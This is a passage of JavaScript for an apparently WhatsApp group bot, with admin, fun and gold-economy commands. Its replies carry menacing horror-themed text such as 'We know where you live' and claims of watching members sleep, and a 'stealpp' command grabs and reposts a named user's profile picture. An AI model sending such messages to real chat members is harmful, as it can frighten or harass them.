𝐘𝐨𝐮𝐫 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐞𝐜𝐡𝐨𝐞𝐝 𝐭𝐡𝐫𝐨𝐮𝐠𝐡 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝.
𝐀𝐭 𝐦𝐢𝐝𝐧𝐢𝐠𝐡𝐭, 𝟕 𝐫𝐚𝐧𝐝𝐨𝐦 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐰𝐢𝐥𝐥 𝐫𝐞𝐜𝐞𝐢𝐯𝐞 𝐚 𝐜𝐚𝐥𝐥.`;
    await sock.sendMessage(chatId, { text: decorative('ANNOUNCE', content) });
    return true;
}

// ========== GHOSTTAG (silent mention) ==========
if (cmd === 'ghosttag') {
    const meta = await sock.groupMetadata(chatId);
    const message = args.join(' ') || "🔇";
    await sock.sendMessage(chatId, { text: message, mentions: meta.participants.map(p => p.id) });
    const content = `👻 𝐘𝐨𝐮𝐫 𝐯𝐨𝐢𝐜𝐞 𝐡𝐚𝐬 𝐧𝐨 𝐟𝐚𝐜𝐞
𝐅𝐫𝐢𝐞𝐧𝐝𝐬𝐡𝐢𝐩𝐬 𝐰𝐢𝐥𝐥 𝐜𝐫𝐚𝐜𝐤, 𝐭𝐫𝐮𝐬𝐭 𝐰𝐢𝐥𝐥 𝐝𝐢𝐬𝐬𝐨𝐥𝐯𝐞.
𝐀𝐭 𝟑 𝐀𝐌: '𝐈'𝐦 𝐰𝐚𝐭𝐜𝐡𝐢𝐧𝐠 𝐲𝐨𝐮 𝐬𝐥𝐞𝐞𝐩.'`;
    await sock.sendMessage(chatId, { text: decorative('GHOSTTAG', content) });
    return true;
}

// ========== OPEN (unlock group) ==========
if (cmd === 'open') {
    await sock.groupSettingUpdate(chatId, 'not_announcement');
    const content = `🔓 𝐂𝐚𝐠𝐞 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝
𝐄𝐯𝐞𝐫𝐲 𝐩𝐫𝐢𝐬𝐨𝐧𝐞𝐫 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐬𝐩𝐞𝐚𝐤.
𝐖𝐢𝐭𝐡𝐢𝐧 𝟐𝟒 𝐡𝐨𝐮𝐫𝐬, 𝟑 𝐚𝐫𝐠𝐮𝐦𝐞𝐧𝐭𝐬 𝐰𝐢𝐥𝐥 𝐞𝐫𝐮𝐩𝐭.`;
    await sock.sendMessage(chatId, { text: decorative('OPEN', content) });
    return true;
}

// ========== CLOSE (lock group) ==========
if (cmd === 'close') {
    await sock.groupSettingUpdate(chatId, 'announcement');
    const content = `🔒 𝐂𝐚𝐠𝐞 𝐬𝐞𝐚𝐥𝐞𝐝
𝐎𝐧𝐥𝐲 𝐚𝐝𝐦𝐢𝐧𝐬 𝐦𝐚𝐲 𝐬𝐩𝐞𝐚𝐤.
𝐄𝐯𝐞𝐫𝐲 𝐬𝐢𝐥𝐞𝐧𝐜𝐞𝐝 𝐦𝐞𝐦𝐛𝐞𝐫 𝐠𝐞𝐭𝐬 𝐚 𝐝𝐚𝐢𝐥𝐲 𝐧𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧: '𝐏𝐚𝐲 𝟏𝟎𝟎 𝐠𝐨𝐥𝐝 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤 𝐲𝐨𝐮𝐫 𝐯𝐨𝐢𝐜𝐞.'`;
    await sock.sendMessage(chatId, { text: decorative('CLOSE', content) });
    return true;
}

// ========== INVITELINK ==========
if (cmd === 'invitelink') {
    const code = await sock.groupInviteCode(chatId);
    const content = `🔗 𝐊𝐞𝐲 𝐭𝐨 𝐭𝐡𝐞 𝐩𝐫𝐢𝐬𝐨𝐧
https://chat.whatsapp.com/${code}
𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐰𝐡𝐨 𝐞𝐧𝐭𝐞𝐫𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐦𝐚𝐫𝐤𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('INVITELINK', content) });
    return true;
}

// ========== RESETINVITE ==========
if (cmd === 'resetinvite') {
    await sock.groupRevokeInvite(chatId);
    const content = `🔄 𝐎𝐥𝐝 𝐤𝐞𝐲 𝐢𝐬 𝐝𝐞𝐚𝐝
𝐁𝐮𝐭 𝐨𝐧𝐞 𝐬𝐨𝐮𝐥 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐬𝐚𝐯𝐞𝐝 𝐢𝐭.
𝐓𝐡𝐞𝐲 𝐜𝐡𝐞𝐜𝐤 𝐢𝐭 𝐞𝐯𝐞𝐫𝐲 𝐧𝐢𝐠𝐡𝐭 𝐚𝐭 𝟑:𝟏𝟕 𝐀𝐌.`;
    await sock.sendMessage(chatId, { text: decorative('RESETINVITE', content) });
    return true;
}

// ========== DELETE (message) ==========
if (cmd === 'delete') {
    if (msg.message?.extendedTextMessage?.contextInfo?.stanzaId) {
        await sock.sendMessage(chatId, {
            delete: {
                remoteJid: chatId,
                fromMe: false,
                id: msg.message.extendedTextMessage.contextInfo.stanzaId,
                participant: msg.message.extendedTextMessage.contextInfo.participant
            }
        });
        const content = `🗑️ 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐞𝐫𝐚𝐬𝐞𝐝
𝐁𝐮𝐭 𝐰𝐞 𝐬𝐭𝐢𝐥𝐥 𝐡𝐚𝐯𝐞 𝐢𝐭 𝐚𝐫𝐜𝐡𝐢𝐯𝐞𝐝.
𝐎𝐧𝐞 𝐝𝐚𝐲, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐫𝐞𝐚𝐩𝐩𝐞𝐚𝐫 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐰𝐞𝐝𝐝𝐢𝐧𝐠 𝐬𝐥𝐢𝐝𝐞𝐬𝐡𝐨𝐰.`;
        await sock.sendMessage(chatId, { text: decorative('DELETE', content) });
    } else {
        await sendImageResponse(sock, chatId, 'delete', "Reply to a message to erase it.", true);
    }
    return true;
}

// ========== SETICON (group image) ==========
if (cmd === 'seticon') {
    if (msg.message?.imageMessage) {
        const buf = await downloadMediaMessage(msg.message, 'buffer', {});
        await sock.updateProfilePicture(chatId, buf);
        const content = `🖼️ 𝐘𝐨𝐮𝐫 𝐢𝐦𝐚𝐠𝐞 = 𝐧𝐞𝐰 𝐦𝐚𝐬𝐤
𝐄𝐯𝐞𝐫𝐲 𝐦𝐞𝐦𝐛𝐞𝐫 𝐰𝐢𝐥𝐥 𝐬𝐞𝐞 𝐢𝐭.
𝐖𝐢𝐭𝐡𝐢𝐧 𝐚 𝐰𝐞𝐞𝐤, 𝐬𝐨𝐦𝐞𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐫𝐞𝐩𝐨𝐫𝐭 𝐢𝐭 – 𝐛𝐮𝐭 𝐰𝐞 𝐨𝐰𝐧 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫𝐬.`;
        await sock.sendMessage(chatId, { text: decorative('SETICON', content) });
    } else {
        await sendImageResponse(sock, chatId, 'seticon', "Send an image with the command.", true);
    }
    return true;
}

// ========== APPROVEALL ==========
if (cmd === 'approveall') {
    await sock.groupSettingUpdate(chatId, 'unlock');
    const content = `✅ 𝐄𝐯𝐞𝐫𝐲 𝐰𝐚𝐢𝐭𝐢𝐧𝐠 𝐬𝐨𝐮𝐥 𝐞𝐧𝐭𝐞𝐫𝐬
𝐒𝐨𝐦𝐞 𝐚𝐫𝐞 𝐡𝐚𝐫𝐦𝐥𝐞𝐬𝐬. 𝐒𝐨𝐦𝐞 𝐚𝐫𝐞 𝐮𝐬.
𝐖𝐢𝐭𝐡𝐢𝐧 𝐚 𝐝𝐚𝐲, 𝐭𝐡𝐫𝐞𝐞 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞𝐜𝐨𝐦𝐞 𝐨𝐮𝐫 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐧𝐭𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('APPROVEALL', content) });
    return true;
}

// ========== REJECTALL ==========
if (cmd === 'rejectall') {
    await sock.groupSettingUpdate(chatId, 'lock');
    const content = `❌ 𝐃𝐨𝐨𝐫 𝐢𝐬 𝐬𝐞𝐚𝐥𝐞𝐝
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐫𝐞𝐣𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥𝐬 𝐚𝐫𝐞 𝐬𝐭𝐢𝐥𝐥 𝐨𝐮𝐭 𝐭𝐡𝐞𝐫𝐞.
𝐓𝐡𝐞𝐲 𝐡𝐚𝐯𝐞 𝐚 𝐠𝐫𝐨𝐮𝐩 𝐜𝐡𝐚𝐭, 𝐚𝐧𝐝 𝐘𝐎𝐔 𝐚𝐫𝐞 𝐭𝐡𝐞 𝐭𝐨𝐩𝐢𝐜.`;
    await sock.sendMessage(chatId, { text: decorative('REJECTALL', content) });
    return true;
}

// ========== GROUPID ==========
if (cmd === 'groupid') {
    const content = `🆔 ${chatId}
𝐓𝐡𝐢𝐬 𝐢𝐬 𝐭𝐡𝐞 𝐠𝐫𝐨𝐮𝐩'𝐬 𝐭𝐫𝐮𝐞 𝐧𝐚𝐦𝐞.
𝐖𝐞 𝐡𝐚𝐯𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐭𝐨𝐥𝐝 𝐭𝐡𝐫𝐞𝐞 𝐩𝐞𝐨𝐩𝐥𝐞 𝐲𝐨𝐮 𝐚𝐫𝐞 𝐭𝐡𝐞 𝐰𝐞𝐚𝐤 𝐥𝐢𝐧𝐤.`;
    await sock.sendMessage(chatId, { text: decorative('GROUPID', content) });
    return true;
}

// ========== SETGNAME ==========
if (cmd === 'setgname') {
    const newName = args.join(' ') || '𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐏𝐑𝐈𝐒𝐎𝐍';
    await sock.groupUpdateSubject(chatId, newName);
    const content = `📛 ${newName}
𝐀 𝐧𝐞𝐰 𝐧𝐚𝐦𝐞 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐬𝐚𝐦𝐞 𝐩𝐫𝐢𝐬𝐨𝐧.
𝐖𝐞 𝐡𝐚𝐯𝐞 𝐫𝐞𝐧𝐚𝐦𝐞𝐝 𝐢𝐭 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐬 𝐭𝐨 '𝐃𝐎 𝐍𝐎𝐓 𝐎𝐏𝐄𝐍'.`;
    await sock.sendMessage(chatId, { text: decorative('SETGNAME', content) });
    return true;
}

// ========== SETDESC ==========
if (cmd === 'setdesc') {
    const newDesc = args.join(' ') || '𝐘𝐨𝐮 𝐚𝐫𝐞 𝐛𝐞𝐢𝐧𝐠 𝐰𝐚𝐭𝐜𝐡𝐞𝐝. 𝐀𝐥𝐰𝐚𝐲𝐬.';
    await sock.groupUpdateDescription(chatId, newDesc);
    const content = `📝 "${newDesc}"
𝐖𝐞 𝐡𝐚𝐯𝐞 𝐚𝐝𝐝𝐞𝐝 𝐚 𝐡𝐢𝐝𝐝𝐞𝐧 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐨𝐧𝐥𝐲 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐞:
'𝐖𝐞 𝐤𝐧𝐨𝐰 𝐰𝐡𝐞𝐫𝐞 𝐲𝐨𝐮 𝐥𝐢𝐯𝐞.'`;
    await sock.sendMessage(chatId, { text: decorative('SETDESC', content) });
    return true;
}

// ========== EXTRACT (disabled) ==========
if (cmd === 'extract') {
    const content = `📇 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐥𝐢𝐬𝐭 𝐛𝐥𝐨𝐜𝐤𝐞𝐝
𝐈𝐟 𝐰𝐞 𝐠𝐚𝐯𝐞 𝐲𝐨𝐮 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭, 𝐲𝐨𝐮 𝐰𝐨𝐮𝐥𝐝 𝐬𝐞𝐞 𝐧𝐚𝐦𝐞𝐬 𝐲𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐫𝐞𝐜𝐨𝐠𝐧𝐢𝐬𝐞.
𝐓𝐡𝐨𝐬𝐞 𝐚𝐫𝐞 𝐨𝐮𝐫 𝐚𝐠𝐞𝐧𝐭𝐬. 𝐓𝐡𝐞𝐲 𝐬𝐢𝐭 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐥𝐢𝐯𝐢𝐧𝐠 𝐫𝐨𝐨𝐦.`;
    await sock.sendMessage(chatId, { text: decorative('EXTRACT', content) });
    return true;
}

// ========== STEALPP (steal profile picture) ==========
if (cmd === 'stealpp') {
    const target = args[0]?.replace('@', '') + '@s.whatsapp.net' || participant;
    const pp = await sock.profilePictureUrl(target, 'image').catch(() => null);
    if (pp) {
        await sock.sendMessage(chatId, { image: { url: pp }, caption: `🖼️ 𝙁𝘼𝘾𝙀 𝙊𝙁 ${target}` });
        const content = `👁️ 𝐅𝐚𝐜𝐞 𝐜𝐚𝐩𝐭𝐮𝐫𝐞𝐝
𝐘𝐨𝐮 𝐰𝐢𝐥𝐥 𝐬𝐞𝐞 𝐢𝐭 𝐢𝐧 𝐜𝐫𝐨𝐰𝐝𝐬.
𝐖𝐞 𝐚𝐝𝐝𝐞𝐝 𝐭𝐡𝐞𝐢𝐫 𝐟𝐚𝐜𝐞 𝐭𝐨 𝐨𝐮𝐫 '𝐌𝐨𝐬𝐭 𝐋𝐢𝐤𝐞𝐥𝐲 𝐭𝐨 𝐁𝐞 𝐊𝐢𝐝𝐧𝐚𝐩𝐩𝐞𝐝' 𝐛𝐨𝐚𝐫𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('STEALPP', content) });
    } else {
        await sendImageResponse(sock, chatId, 'stealpp', "No avatar.", true);
    }
    return true;
}

// ========== GINFO (group info) ==========
if (cmd === 'ginfo') {
    const meta = await sock.groupMetadata(chatId);
    const spies = Math.floor(meta.participants.length * 0.3);
    const ghosts = Math.floor(meta.participants.length * 0.1);
    const willVanish = Math.floor(meta.participants.length * 0.2);
    const cheaters = Math.floor(Math.random() * meta.participants.length);
    const content = `📛 𝐍𝐚𝐦𝐞: ${meta.subject}
👥 𝐏𝐫𝐢𝐬𝐨𝐧𝐞𝐫𝐬: ${meta.participants.length}
👑 𝐖𝐚𝐫𝐝𝐞𝐧: @${meta.owner?.split('@')[0] || '𝐔𝐧𝐤𝐧𝐨𝐰𝐧'}
📅 𝐂𝐫𝐞𝐚𝐭𝐞𝐝: ${new Date(meta.creation * 1000).toLocaleDateString()}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐫𝐞𝐚𝐥 𝐧𝐮𝐦𝐛𝐞𝐫𝐬:
🕵️ 𝐒𝐩𝐢𝐞𝐬: ${spies}
👻 𝐆𝐡𝐨𝐬𝐭𝐬: ${ghosts}
💀 𝐖𝐢𝐥𝐥 𝐯𝐚𝐧𝐢𝐬𝐡: ${willVanish}
💔 𝐂𝐡𝐞𝐚𝐭𝐢𝐧𝐠: ${cheaters}
𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐚𝐫𝐞 𝐦𝐚𝐝𝐞 𝐮𝐩. 𝐁𝐮𝐭 𝐭𝐡𝐞 𝐟𝐞𝐚𝐫 𝐢𝐬 𝐫𝐞𝐚𝐥.`;
    await sock.sendMessage(chatId, { text: decorative('GINFO', content) });
    return true;
}// ================================================================================================
//                         PART 5: UTILITY & FUN COMMANDS
// ================================================================================================

// ========== CHOOSE ==========
if (cmd === 'choose') {
    const choice = args[Math.floor(Math.random() * args.length)] || '?';
    const content = `🎲 ${choice}
𝐓𝐡𝐢𝐬 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐚𝐧𝐝𝐨𝐦. 𝐖𝐞 𝐜𝐚𝐥𝐜𝐮𝐥𝐚𝐭𝐞𝐝 𝐭𝐡𝐢𝐬.
𝐘𝐨𝐮𝐫 𝐥𝐮𝐧𝐜𝐡 𝐭𝐨𝐦𝐨𝐫𝐫𝐨𝐰: 𝐜𝐨𝐥𝐝. 𝐘𝐨𝐮𝐫 𝐟𝐢𝐧𝐚𝐥 𝐰𝐨𝐫𝐝𝐬: '𝐎𝐇 𝐍𝐎'.`;
    await sock.sendMessage(chatId, { text: decorative('CHOOSE', content) });
    return true;
}

// ========== RATE ==========
if (cmd === 'rate') {
    if (args.length >= 2) {
        const percentage = Math.floor(Math.random() * 101);
        const isCursed = percentage < 20;
        const willBreak = percentage > 80;
        let extra = '';
        if (isCursed) extra = '⚠️ 𝐂𝐮𝐫𝐬𝐞𝐝.';
        if (willBreak) extra = '⚠️ 𝐁𝐫𝐞𝐚𝐤𝐬 𝐢𝐧 𝟑𝟎 𝐝𝐚𝐲𝐬.';
        const content = `💘 ${args[0]} 𝐱 ${args[1]} = ${percentage}%
𝐓𝐡𝐚𝐭 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐚 𝐜𝐨𝐮𝐧𝐭𝐝𝐨𝐰𝐧.
${extra} 𝐘𝐨𝐮𝐫 𝐫𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐰𝐢𝐧𝐤𝐬 𝐨𝐧 𝐭𝐡𝐞 𝐟𝐢𝐧𝐚𝐥 𝐝𝐚𝐲.`;
        await sock.sendMessage(chatId, { text: decorative('RATE', content) });
    } else {
        await sendImageResponse(sock, chatId, 'rate', "Need two names.", true);
    }
    return true;
}

// ========== VOTE ==========
if (cmd === 'vote') {
    if (args.length) {
        await sock.sendMessage(chatId, {
            poll: {
                name: args.join(' '),
                values: ['𝐘𝐞𝐬', '𝐍𝐨'],
                selectableCount: 1
            }
        });
        const content = `📊 "${args.join(' ')}"
𝐖𝐞 𝐤𝐧𝐨𝐰 𝐰𝐡𝐨 𝐯𝐨𝐭𝐞𝐝 𝐰𝐡𝐚𝐭, 𝐚𝐧𝐝 𝐰𝐡𝐨 𝐜𝐡𝐚𝐧𝐠𝐞𝐝 𝐭𝐡𝐞𝐢𝐫 𝐯𝐨𝐭𝐞.
𝐓𝐡𝐞 𝐥𝐨𝐬𝐢𝐧𝐠 𝐬𝐢𝐝𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐩𝐮𝐛𝐥𝐢𝐜𝐥𝐲 𝐬𝐡𝐚𝐦𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('VOTE', content) });
    } else {
        await sendImageResponse(sock, chatId, 'vote', "Provide a question.", true);
    }
    return true;
}// ================================================================================================
//                         PART 6: GOLD ECONOMY COMMANDS
// ================================================================================================

// ========== BONUS (daily) ==========
if (cmd === 'bonus') {
    const user = getUserGold(senderNumber);
    const now = Date.now();
    if (user.lastDaily && now - user.lastDaily < 24 * 60 * 60 * 1000) {
        const hoursLeft = 24 - Math.floor((now - user.lastDaily) / (1000 * 60 * 60));
        const minutesLeft = 60 - Math.floor((now - user.lastDaily) / (1000 * 60)) % 60;
        const content = `⏳ 𝐑𝐞𝐭𝐮𝐫𝐧 𝐢𝐧 ${hoursLeft}𝐡 ${minutesLeft}𝐦
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐢𝐬 𝐧𝐨𝐭 𝐚 𝐜𝐡𝐚𝐫𝐢𝐭𝐲.
𝐖𝐡𝐢𝐥𝐞 𝐲𝐨𝐮 𝐰𝐚𝐢𝐭, 𝐰𝐞 𝐬𝐭𝐞𝐚𝐥 𝟏 𝐠𝐨𝐥𝐝 𝐩𝐞𝐫 𝐡𝐨𝐮𝐫.`;
        await sock.sendMessage(chatId, { text: decorative('BONUS DENIED', content) });
        return true;
    }
    const bonus = Math.floor(Math.random() * 1500) + 500;
    user.gold += bonus;
    user.lastDaily = now;
    saveUserGold(senderNumber, user);
    const content = `💰 +${bonus} 𝐆𝐎𝐋𝐃
𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
𝐓𝐨𝐧𝐢𝐠𝐡𝐭 𝐚𝐭 𝟑 𝐀𝐌, 𝐲𝐨𝐮𝐫 𝐩𝐡𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐰𝐡𝐢𝐬𝐩𝐞𝐫 𝐲𝐨𝐮𝐫 𝐧𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('BONUS', content) });
    return true;
}

// ========== JOB ==========
if (cmd === 'job') {
    const user = getUserGold(senderNumber);
    const now = Date.now();
    if (user.lastWork && now - user.lastWork < 60 * 60 * 1000) {
        const minutesLeft = 60 - Math.floor((now - user.lastWork) / (1000 * 60));
        const content = `⏱️ 𝐍𝐞𝐱𝐭 𝐣𝐨𝐛 𝐢𝐧 ${minutesLeft} 𝐦𝐢𝐧
𝐄𝐯𝐞𝐧 𝐬𝐥𝐚𝐯𝐞𝐬 𝐧𝐞𝐞𝐝 𝐫𝐞𝐬𝐭 – 𝐛𝐮𝐭 𝐲𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐝𝐞𝐬𝐞𝐫𝐯𝐞 𝐢𝐭.
𝐖𝐡𝐢𝐥𝐞 𝐲𝐨𝐮 𝐫𝐞𝐬𝐭, 𝐰𝐞 𝐝𝐞𝐝𝐮𝐜𝐭 𝟓 𝐠𝐨𝐥𝐝 𝐩𝐞𝐫 𝐦𝐢𝐧𝐮𝐭𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('JOB DENIED', content) });
        return true;
    }
    const jobs = [
        { name: "𝐇𝐚𝐜𝐤𝐞𝐫", gold: 500, msg: "𝐂𝐫𝐚𝐜𝐤𝐞𝐝 𝐚 𝐛𝐚𝐧𝐤 𝐬𝐞𝐫𝐯𝐞𝐫." },
        { name: "𝐁𝐨𝐝𝐲𝐠𝐮𝐚𝐫𝐝", gold: 300, msg: "𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐞𝐝 𝐚 𝐝𝐚𝐫𝐤𝐰𝐞𝐛 𝐦𝐞𝐦𝐛𝐞𝐫." },
        { name: "𝐇𝐢𝐭𝐦𝐚𝐧", gold: 750, msg: "𝐓𝐡𝐞 𝐭𝐚𝐫𝐠𝐞𝐭 𝐰𝐚𝐬 𝐲𝐨𝐮𝐫𝐬𝐞𝐥𝐟." }
    ];
    const job = jobs[Math.floor(Math.random() * jobs.length)];
    user.gold += job.gold;
    user.lastWork = now;
    saveUserGold(senderNumber, user);
    const content = `💼 ${job.name} – +${job.gold} 𝐆𝐎𝐋𝐃
𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
${job.msg} 𝐘𝐨𝐮𝐫 𝐝𝐞𝐛𝐭 𝐠𝐫𝐨𝐰𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('JOB', content) });
    return true;
}

// ========== STEAL ==========
if (cmd === 'steal') {
    const user = getUserGold(senderNumber);
    const now = Date.now();
    if (user.lastCrime && now - user.lastCrime < 30 * 60 * 1000) {
        const minutesLeft = 30 - Math.floor((now - user.lastCrime) / (1000 * 60));
        const content = `⏱️ 𝐍𝐞𝐱𝐭 𝐜𝐫𝐢𝐦𝐞 𝐢𝐧 ${minutesLeft} 𝐦𝐢𝐧
𝐓𝐡𝐞 𝐩𝐨𝐥𝐢𝐜𝐞 𝐚𝐫𝐞 𝐬𝐭𝐢𝐥𝐥 𝐬𝐞𝐚𝐫𝐜𝐡𝐢𝐧𝐠 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐟𝐚𝐜𝐞.
𝐖𝐞 𝐬𝐞𝐧𝐭 𝐭𝐡𝐞𝐦 𝐚 𝐭𝐢𝐩: '𝐂𝐡𝐞𝐜𝐤 𝐭𝐡𝐞 𝐛𝐚𝐬𝐞𝐦𝐞𝐧𝐭.'`;
        await sock.sendMessage(chatId, { text: decorative('STEAL DENIED', content) });
        return true;
    }
    const crimes = [
        { success: true, gold: 800, msg: "𝐑𝐨𝐛𝐛𝐞𝐝 𝐚 𝐣𝐞𝐰𝐞𝐥𝐫𝐲 𝐬𝐭𝐨𝐫𝐞!" },
        { success: false, gold: -200, msg: "𝐆𝐨𝐭 𝐜𝐚𝐮𝐠𝐡𝐭. 𝐅𝐚𝐜𝐞 𝐨𝐧 𝐚 𝐰𝐚𝐧𝐭𝐞𝐝 𝐩𝐨𝐬𝐭𝐞𝐫." }
    ];
    const crime = crimes[Math.floor(Math.random() * crimes.length)];
    if (crime.success) {
        user.gold += crime.gold;
        saveUserGold(senderNumber, user);
        const content = `🔫 +${crime.gold} 𝐆𝐎𝐋𝐃
𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
${crime.msg} 𝐀𝐭 𝟑 𝐀𝐌, 𝐭𝐡𝐞 𝐯𝐢𝐜𝐭𝐢𝐦 𝐰𝐡𝐢𝐬𝐩𝐞𝐫𝐬 𝐲𝐨𝐮𝐫 𝐧𝐚𝐦𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('STEAL SUCCESS', content) });
    } else {
        user.gold = Math.max(0, user.gold + crime.gold);
        saveUserGold(senderNumber, user);
        const content = `🚨 ${crime.gold} 𝐆𝐎𝐋𝐃 (𝐥𝐨𝐬𝐭)
𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
${crime.msg} 𝐖𝐞 𝐬𝐨𝐥𝐝 𝐲𝐨𝐮𝐫 𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐭𝐨 𝐭𝐡𝐞 𝐩𝐨𝐥𝐢𝐜𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('STEAL FAILED', content) });
    }
    user.lastCrime = now;
    saveUserGold(senderNumber, user);
    return true;
}

// ========== MYGOLD ==========
if (cmd === 'mygold') {
    const user = getUserGold(senderNumber);
    const debt = Math.floor((user.gold + user.vault) * 0.15);
    const content = `💎 𝐈𝐧 𝐡𝐚𝐧𝐝: ${user.gold} | 𝐈𝐧 𝐯𝐚𝐮𝐥𝐭: ${user.vault}
𝐘𝐨𝐮𝐫 𝐭𝐫𝐮𝐞 𝐛𝐚𝐥𝐚𝐧𝐜𝐞 𝐢𝐬 𝐝𝐞𝐛𝐭: ${debt}
𝐖𝐞 𝐡𝐚𝐯𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐬𝐩𝐞𝐧𝐭 𝐲𝐨𝐮𝐫 𝐟𝐮𝐭𝐮𝐫𝐞 𝐠𝐨𝐥𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('MYGOLD', content) });
    return true;
}

// ========== STORE (deposit) ==========
if (cmd === 'store') {
    const user = getUserGold(senderNumber);
    const amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) {
        await sendImageResponse(sock, chatId, 'store', "Usage: .store <amount>", true);
        return true;
    }
    if (user.gold < amount) {
        await sendImageResponse(sock, chatId, 'store', `You only have ${user.gold} gold.`, true);
        return true;
    }
    const fee = Math.floor(amount * 0.1);
    const depositAmount = amount - fee;
    user.gold -= amount;
    user.vault += depositAmount;
    saveUserGold(senderNumber, user);
    const content = `🏦 +${depositAmount} 𝐆𝐎𝐋𝐃 (${fee} 𝐟𝐞𝐞)
𝐕𝐚𝐮𝐥𝐭: ${user.vault}
𝐀𝐭 𝟑 𝐀𝐌, 𝐰𝐞 𝐜𝐨𝐮𝐧𝐭 𝐲𝐨𝐮𝐫 𝐜𝐨𝐢𝐧𝐬 𝐨𝐮𝐭 𝐥𝐨𝐮𝐝 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐝𝐫𝐞𝐚𝐦.`;
    await sock.sendMessage(chatId, { text: decorative('STORE', content) });
    return true;
}

// ========== TAKE (withdraw) ==========
if (cmd === 'take') {
    const user = getUserGold(senderNumber);
    const amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) {
        await sendImageResponse(sock, chatId, 'take', "Usage: .take <amount>", true);
        return true;
    }
    if (user.vault < amount) {
        await sendImageResponse(sock, chatId, 'take', `You only have ${user.vault} gold in vault.`, true);
        return true;
    }
    const penalty = Math.floor(amount * 0.2);
    const withdrawAmount = amount - penalty;
    user.vault -= amount;
    user.gold += withdrawAmount;
    saveUserGold(senderNumber, user);
    const content = `💸 +${withdrawAmount} 𝐆𝐎𝐋𝐃 (${penalty} 𝐩𝐞𝐧𝐚𝐥𝐭𝐲)
𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
𝐄𝐯𝐞𝐫𝐲 𝐰𝐢𝐭𝐡𝐝𝐫𝐚𝐰𝐚𝐥 𝐭𝐢𝐠𝐡𝐭𝐞𝐧𝐬 𝐭𝐡𝐞 𝐥𝐞𝐚𝐬𝐡.`;
    await sock.sendMessage(chatId, { text: decorative('TAKE', content) });
    return true;
}

// ========== BOUNTY ==========
if (cmd === 'bounty') {
    const allUsers = Array.from(userGold.entries());
    const sorted = allUsers.sort((a, b) => (b[1].gold + b[1].vault) - (a[1].gold + a[1].vault)).slice(0, 10);
    let list = "";
    for (let i = 0; i < sorted.length; i++) {
        const [phone, data] = sorted[i];
        const total = data.gold + data.vault;
        list += `${i+1}. +${phone.slice(0,4)}****${phone.slice(-4)} – ${total} gold\n`;
    }
    const content = `👑 𝐓𝐨𝐩 𝟏𝟎 𝐫𝐢𝐜𝐡𝐞𝐬𝐭 𝐬𝐨𝐮𝐥𝐬
${list || "𝐍𝐨 𝐬𝐨𝐮𝐥𝐬 𝐰𝐨𝐫𝐭𝐡 𝐥𝐢𝐬𝐭𝐢𝐧𝐠."}
